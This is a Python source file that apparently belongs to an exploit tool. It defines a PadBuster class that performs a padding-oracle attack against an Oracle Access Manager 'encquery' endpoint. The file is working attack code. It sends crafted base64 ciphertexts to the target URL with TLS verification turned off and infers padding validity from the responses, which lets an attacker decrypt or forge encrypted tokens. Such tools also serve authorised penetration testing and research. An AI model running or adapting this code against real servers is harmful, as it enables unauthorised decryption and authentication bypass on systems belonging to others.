import sys

import urllib

from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode
from urllib import quote
import requests
import socket
import time
import logging
from lib.constants import Constants
from lib.util import Util


class PadBuster(PaddingOracle):
    def __init__(self, prefix_message, padding_success_msg, padding_fail_msg, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self._padding_success_msg = padding_success_msg
        self._padding_fail_msg = padding_fail_msg
        self._prefix_message = prefix_message
        self.wait = kwargs.get('wait', 2.0)
        self._logger = logging.getLogger(Constants.LOGGER_NAME)

    def oracle(self, data, **kwargs):
        request_sent = False
        cnt = 0
        while not request_sent:
            try:
                msg = self._prefix_message.encquery + data
                encoded_msg = b64encode(msg)

                cnt = cnt + 1
                if cnt > Constants.MAX_RETRIES:
                    self._logger.error("Max retries exceeded. Stopping...")
                    sys.exit(-1)

                url = self._prefix_message.oam_url + "?encquery=" + urllib.quote(
                    encoded_msg + '  ' + self._prefix_message.extra_params)
                self._logger.debug('Requesting: %s', url)
                response = requests.get(url, stream=False, timeout=Constants.NETWORK_TIMEOUT, verify=False, allow_redirects=False)
                request_sent = True

            except (socket.error, requests.exceptions.RequestException):
                self._logger.exception('Retrying request in %.2f seconds...',
                                       self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)
        content = response.text
        self._logger.debug("Response content: %s", content)

        padding_error = Util.has_padding_error(response=response,
                                               success_msg=self._padding_success_msg,
                                               fail_msg=self._padding_fail_msg, logger=self._logger)
        if padding_error:
            raise BadPaddingException
        else:
            self._logger.info('No padding error for: %r', quote(b64encode(data)))
            return
